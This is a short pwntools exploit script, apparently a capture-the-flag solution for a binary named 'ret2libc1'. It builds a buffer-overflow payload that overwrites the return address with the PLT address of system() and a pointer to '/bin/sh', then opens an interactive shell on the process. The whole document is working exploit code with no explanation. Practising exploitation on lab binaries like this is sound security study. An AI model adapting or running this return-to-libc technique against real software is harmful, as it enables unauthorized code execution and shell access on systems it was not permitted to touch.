from pwn import *

file_path = "./ret2libc1"
file = ELF(file_path)
system_addr = file.plt["system"]
bin_sh_addr = next(file.search(b"/bin/sh"))
offset = 0x6C + 4
payload = offset * b"A" + p32(system_addr) + p32(0xCCCCCCCC) + p32(bin_sh_addr)
sh = process(file_path)
sh.sendline(payload)
sh.interactive()
